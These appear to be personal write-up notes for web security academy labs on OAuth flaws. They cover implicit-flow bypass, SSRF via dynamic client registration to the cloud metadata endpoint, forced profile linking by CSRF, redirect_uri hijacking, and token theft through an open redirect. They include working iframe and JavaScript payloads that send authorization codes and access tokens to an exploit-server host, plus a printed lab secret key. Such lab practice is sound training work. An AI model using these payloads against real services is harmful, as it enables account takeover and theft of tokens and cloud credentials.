### Authentication bypass via OAuth implicit flow

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`

Check all the OAuth flow, intercept the one giving user information in the `/authenticate` endpoint. 
Get the 302 status code, and then, right click on the request, select `Request in browser`. Paste the URL and solved

---
### SSRF via OpenID dynamic client registration

To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

I needed to follow the steps for this one, because it has a weird beginning:

1. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`
2. Craft this request, to validate that you can register your own client application without authorization
```
POST /reg HTTP/1.1 
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net 
Content-Type: application/json 

{ 
	"redirect_uris" : [ 
		"https://example.com" 
	] 
}
```

3. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
4. Add this to the crafted request to /reg: `"logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"` get the client_id from the request, and replace it in the `/client/CLIENT-ID/logo` request. You should see the collaborator receiving a HTTP request. This validates that we had SSRF from the OAuth server.
5. Replace the `logo_uri` with this `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`. Copy the `client_id`from the request
6. Send this value with the `/client/CLIENT-ID/logo` request, and submit the SecretAccessKey

Answer: `rsWELUK1PqsS0V1jmsknpYzxW52xgUh29AQpfJKS`

---
### Forced OAuth profile linking

Notice the request does not include a `state` parameter to protect against CSRF attacks

When you sync your social media account, one of the requests sends a code value. 

That's the code you'll use to perform a CSRF attack, by using it to authenticate as the victim doing an iframe lead within the admin window. The payload will be an iframe with that URL as the source. The one containing the `code=xxxx`:

`<iframe src="https://LAB-ID.web-security-academy.net/oauth-linking?code=YOUR-CODE-HERE"></iframe>`

---
### OAuth account hijacking via redirect_uri

Complete the login flow, log out and log in again. You don't need to input anything now. 

You can modify the redirect_uri on the GET /auth?client_id= to anything you want. 

Go to exploit server, this is the body:
```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Deliver exploit, stole the code, log out from your account, and log in here with the code_
`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`

Delete Carlos account.

---
### Stealing OAuth access tokens via an open redirect

`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`

Visit that URL to thest your exploit works, and the body on the exploit server must be:
```html
<script> window.location = '/?'+document.location.hash.substr(1) </script>
```

You should receive a new code in the access log.

Now, use this as body:
```html
<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>
```

Deiver exploit to victim, access log, and steal the code.

Send a request to the GET /me endpoint, and use that code as the authorization token.

Submit the API key as the solution.